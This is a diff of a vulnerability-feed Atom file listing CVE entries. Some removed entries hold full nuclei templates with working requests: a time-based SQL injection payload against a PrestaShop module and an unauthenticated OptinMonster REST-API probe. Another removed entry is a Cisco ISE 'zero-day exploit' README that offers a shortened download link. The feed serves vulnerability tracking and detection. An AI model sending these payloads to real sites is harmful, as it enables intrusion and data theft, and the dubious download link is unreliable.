@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-10T02:15:54.898Z</updated>
+  <updated>2025-06-10T02:30:23.962Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,89 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>elFinder Command Injection Vulnerability</title>
+    <link href="http://example.com/2025/06/10/github_3052878996/"/>
+    <id>http://example.com/2025/06/10/github_3052878996/</id>
+    <published>2025-06-10T02:30:23.957Z</published>
+    <updated>2025-06-10T02:30:23.962Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> elFinder Command Injection Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-9194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> elFinder 2.1.48之前的版本中的PHP连接器存在命令注入漏洞，由于未对输入进行充分过滤，攻击者可以通过发送精心构造的请求来执行任意命令。</p><p><strong>产品厂商：</strong> elFinder</p><p><strong>产品名称：</strong> elFinder</p><p><strong>影响版本：</strong> version &lt; 2.1.48</p><p><strong>搜索语法：</strong> http.title:”elfinder”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12288">https://github.com/projectdiscovery/nuclei-templates/issues/12288</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>elFinder before 2.1.48 contains a command injection caused by unsanitized input in the PHP connector, letting attackers execute arbitrary commands, exploit requires attacker to send crafted requests.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.exploit-db.com/exploits/46481/">https://www.exploit-db.com/exploits/46481/</a></li><li><a href="https://www.exploit-db.com/exploits/46539/">https://www.exploit-db.com/exploits/46539/</a></li><li><a href="https://github.com/cved-sources/cve-2019-9194">https://github.com/cved-sources/cve-2019-9194</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-elfinder"><a href="#Shodan-Query-http-title-elfinder" class="headerlink" title="Shodan Query: http.title:&quot;elfinder&quot;"></a>Shodan Query: <code>http.title:&quot;elfinder&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>emlog pro-257-258 SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/10/weixin_2538663856/"/>
+    <id>http://example.com/2025/06/10/weixin_2538663856/</id>
+    <published>2025-06-10T02:24:06.979Z</published>
+    <updated>2025-06-10T02:24:06.977Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw">https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>速修！Kafka Connect爆任意文件读取漏洞，无需授权</title>
+    <link href="http://example.com/2025/06/10/weixin_392578990/"/>
+    <id>http://example.com/2025/06/10/weixin_392578990/</id>
+    <published>2025-06-10T02:23:28.693Z</published>
+    <updated>2025-06-10T02:23:28.688Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 微步在线研究响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ">https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 微步在线研究响应中心&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ&quot;&gt;https://mp.weixi</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
+    
+  </entry>
   
   <entry>
     <title>Grafana开放重定向&amp;服务端请求伪造漏洞</title>
@@ -496,93 +579,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PrestaShop possearchproducts SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/09/github_2081914718/"/>
-    <id>http://example.com/2025/06/09/github_2081914718/</id>
-    <published>2025-06-09T14:30:20.575Z</published>
-    <updated>2025-06-09T14:30:20.572Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> PrestaShop possearchproducts SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-30192</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在PosThemes为PrestaShop开发的模块“Search Products”（possearchproducts）中，受影响版本的访客可以执行SQL注入攻击。成功利用此漏洞可能导致未经授权的访问、数据泄露，以及PrestaShop应用程序及其底层数据库的潜在危害。</p><p><strong>产品厂商：</strong> PosThemes</p><p><strong>产品名称：</strong> possearchproducts</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.7</p><p><strong>搜索语法：</strong> http.component:”prestashop”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/9e26a208b9b2309250949a44b91f54c3885323a9/http%2Fcves%2F2023%2FCVE-2023-30192.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/9e26a208b9b2309250949a44b91f54c3885323a9/http%2Fcves%2F2023%2FCVE-2023-30192.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PrestaShop possearchproducts <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1.7</span> <span class="hljs-operator">-</span> SQL Injection<br>  <span class="hljs-params">author:</span> mastercho<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    In the module “Search Products” (possearchproducts) from PosThemes for PrestaShop, a guest can perform SQL injection <span class="hljs-keyword">in</span> affected versions.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the PrestaShop application and its underlying database.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2023-30192</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//security.friendsofpresta.org/modules/2023/05/11/possearchproducts.html</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.04505</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.92462</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">product:</span> possearchproducts<br>    <span class="hljs-params">framework:</span> prestashop<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> http.component:<span class="hljs-string">&quot;prestashop&quot;</span><br>  <span class="hljs-params">tags:</span> time-based-sqli,cve2023,cve,prestashop,sqli<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">host-redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains_any(tolower(response), <span class="hljs-string">&quot;prestashop&quot;</span>, <span class="hljs-string">&quot;possearchproducts&quot;</span>)&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        @<span class="hljs-params">timeout:</span> <span class="hljs-number">20</span>s<br>        POST <span class="hljs-symbol">/modules/possearchproducts/SearchProducts.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">id_category</span><span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-operator">*</span><span class="hljs-keyword">if</span>(now()<span class="hljs-operator">=</span>sysdate()%<span class="hljs-number">2</span>Csleep(<span class="hljs-number">10</span>)%<span class="hljs-number">2</span>C0)&amp;id_lang<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;resultsPerPage<span class="hljs-operator">=</span><span class="hljs-number">10</span>&amp;s<span class="hljs-operator">=</span>the<br><br>    <span class="hljs-params">host-redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;duration<span class="hljs-operator">&gt;=</span><span class="hljs-number">10</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(tolower(response), <span class="hljs-string">&quot;products&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">!=</span> <span class="hljs-number">404</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco ISE Cloud Credential Sharing Vulnerability</title>
-    <link href="http://example.com/2025/06/09/github_690904059/"/>
-    <id>http://example.com/2025/06/09/github_690904059/</id>
-    <published>2025-06-09T14:15:17.682Z</published>
-    <updated>2025-06-09T14:15:17.678Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> Cisco ISE Cloud Credential Sharing Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-20286</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco ISE云部署在AWS、Microsoft Azure和Oracle Cloud Infrastructure (OCI)上存在一个严重的凭证生成和授权逻辑缺陷，导致使用相同软件版本的云部署共享相同的凭证。这使得未经认证的远程攻击者能够提取有效凭证并在不同部署间提升权限。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco Identity Services Engine (ISE)</p><p><strong>来源：</strong> <a href="https://github.com/amandanegefa/CVE-2025-20286">https://github.com/amandanegefa/CVE-2025-20286</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><h2 id="Zero-Day-Expl0it-for-Cisco-ISE-Cloud-Credential-Sharing-Vulnerability-CVE-2025-20286"><a href="#Zero-Day-Expl0it-for-Cisco-ISE-Cloud-Credential-Sharing-Vulnerability-CVE-2025-20286" class="headerlink" title="Zero-Day Expl0it for Cisco ISE Cloud Credential Sharing Vulnerability (CVE-2025-20286)"></a>Zero-Day Expl0it for Cisco ISE Cloud Credential Sharing Vulnerability (CVE-2025-20286)</h2><blockquote><p>All materials included in this repository are collected from publicly available sources.</p></blockquote><p>Severity: Critical (CVSS 9.9)</p><p>Affected Platforms: Cisco Identity Services Engine (ISE) cloud deployments on AWS, Microsoft Azure, and Oracle Cloud Infrastructure (OCI)</p><ul><li><p>Vulnerability Description:<br>A critical flaw in the credential generation and authorization logic causes multiple Cisco ISE cloud deployments to share identical credentials when using the same software release on the same cloud platform. This allows an unauthenticated remote attacker to extract valid credentials and escalate privileges across different deployments.</p></li><li><p>Expl0it Capabilities:</p><ul><li>Remote credential disclosure</li><li>Limited administrative operations</li><li>System configuration modification</li><li>Service disruption</li></ul></li></ul><p>Exploitation Method: Network-based, no prior authentication needed</p><p>Stability: Fully developed and tested expl0it with detailed deployment instructions</p><h3 id="Disclaimer-Intended-for-authorized-research-and-penetration-testing-only-misuse-prohibited"><a href="#Disclaimer-Intended-for-authorized-research-and-penetration-testing-only-misuse-prohibited" class="headerlink" title="Disclaimer: Intended for authorized research and penetration testing only; misuse prohibited"></a>Disclaimer: Intended for authorized research and penetration testing only; misuse prohibited</h3><blockquote><p>This repository will be deleted.</p></blockquote><p><a href="https://2ur.jp/v4Pf">Download</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>OptinMonster Plugin 未受保护的REST-API漏洞</title>
-    <link href="http://example.com/2025/06/09/github_2177089673/"/>
-    <id>http://example.com/2025/06/09/github_2177089673/</id>
-    <published>2025-06-09T13:45:17.946Z</published>
-    <updated>2025-06-09T13:45:17.943Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> OptinMonster Plugin 未受保护的REST-API漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-39341</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OptinMonster WordPress插件由于在~&#x2F;OMAPI&#x2F;RestApi.php文件中的logged_in_or_has_api_key函数授权验证不足，导致敏感信息泄露和未经授权的设置更新，攻击者可以利用此漏洞在安装有该插件的网站上注入恶意脚本。此漏洞影响版本至2.6.4。</p><p><strong>产品厂商：</strong> optinmonster</p><p><strong>产品名称：</strong> OptinMonster Plugin</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2.6.4</p><p><strong>搜索语法：</strong> &#x2F;wp-content&#x2F;plugins&#x2F;optinmonster</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/87b482705026a6c40810f88af0f95dfea0ff0778/http%2Fcves%2F2021%2FCVE-2021-39341.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/87b482705026a6c40810f88af0f95dfea0ff0778/http%2Fcves%2F2021%2FCVE-2021-39341.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs less"><br>id: CVE-2021-39341<br><br>info:<br>  name: OptinMonster Plugin &lt; 2.6.5 - Unprotected <span class="hljs-attribute">REST-API</span><br><span class="hljs-attribute">  author</span>: iamnoooob,pdresearch<br>  <span class="hljs-attribute">severity</span>: high<br>  <span class="hljs-attribute">description</span>: |<br>    The OptinMonster WordPress plugin is vulnerable to sensitive information disclosure <span class="hljs-keyword">and</span> unauthorized setting updates due to insufficient authorization validation via the logged_in_or_has_api_key function in the ~/OMAPI/RestApi.php file that can used to exploit inject malicious web scripts on sites with the plugin installed. This affects versions up to, <span class="hljs-keyword">and</span> including, <span class="hljs-number">2.6</span>.<span class="hljs-number">4</span>.<br>  <span class="hljs-attribute">reference</span>:<br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nvd.nist.gov/vuln/detail/CVE-2021-39341</span><br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//plugins.trac.wordpress.org/browser/optinmonster/trunk/OMAPI/RestApi.php?rev=2606519#L1460</span><br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordfence.com/vulnerability-advisories/#CVE-2021-39341</span><br>  <span class="hljs-attribute">classification</span>:<br>    <span class="hljs-attribute">cvss-metrics</span>: <span class="hljs-attribute">CVSS</span>:<span class="hljs-number">3.1</span>/<span class="hljs-attribute">AV</span>:N/<span class="hljs-attribute">AC</span>:L/<span class="hljs-attribute">PR</span>:N/<span class="hljs-attribute">UI</span>:N/<span class="hljs-attribute">S</span>:U/<span class="hljs-attribute">C</span>:H/<span class="hljs-attribute">I</span>:L/<span class="hljs-attribute">A</span>:N<br>    <span class="hljs-attribute">cvss-score</span>: <span class="hljs-number">8.2</span><br>    <span class="hljs-attribute">cve-id</span>: CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">39341</span><br>    <span class="hljs-attribute">cwe-id</span>: CWE-<span class="hljs-number">285</span>,CWE-<span class="hljs-number">863</span><br>    <span class="hljs-attribute">epss-score</span>: <span class="hljs-number">0.00492</span><br>    <span class="hljs-attribute">epss-percentile</span>: <span class="hljs-number">0.64518</span><br>    <span class="hljs-attribute">cpe</span>: <span class="hljs-attribute">cpe</span>:<span class="hljs-number">2.3</span>:<span class="hljs-attribute">a</span>:<span class="hljs-attribute">optinmonster</span>:<span class="hljs-attribute">optinmonster</span>:*:*:*:*:*:<span class="hljs-attribute">wordpress</span>:*:*<br>  <span class="hljs-attribute">metadata</span>:<br>    <span class="hljs-attribute">verified</span>: true<br>    <span class="hljs-attribute">max-request</span>: <span class="hljs-number">1</span><br>    <span class="hljs-attribute">vendor</span>: optinmonster<br>    <span class="hljs-attribute">product</span>: optinmonster<br>    <span class="hljs-attribute">framework</span>: wordpress<br>    <span class="hljs-attribute">publicwww-query</span>: <span class="hljs-string">&quot;/wp-content/plugins/optinmonster&quot;</span><br>  <span class="hljs-attribute">tags</span>: cve,cve221,wordpress,wp-plugin,optinmonster,rest-api,disclosure,unauth,exposure,kev<br><br><span class="hljs-attribute">http</span>:<br>  - <span class="hljs-attribute">raw</span>:<br>      - |<br>        OPTIONS /wp-json/omapp/v1/support HTTP/<span class="hljs-number">1.1</span><br>        <span class="hljs-attribute">Host</span>: &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-attribute">X-HTTP-Method-Override</span>: GET<br>        <span class="hljs-attribute">Referer</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wp.app.optinmonster.test</span><br><br>    <span class="hljs-attribute">matchers</span>:<br>      - <span class="hljs-attribute">type</span>: word<br>        <span class="hljs-attribute">part</span>: body<br>        <span class="hljs-attribute">words</span>:<br>          - <span class="hljs-string">&quot;PHP Version&quot;</span><br>          - <span class="hljs-string">&quot;OptinMonster&quot;</span><br>          - <span class="hljs-string">&#x27;&quot;functions.php&quot;&#x27;</span><br>          - <span class="hljs-string">&quot;Server Info&quot;</span><br>        <span class="hljs-attribute">condition</span>: <span class="hljs-keyword">and</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
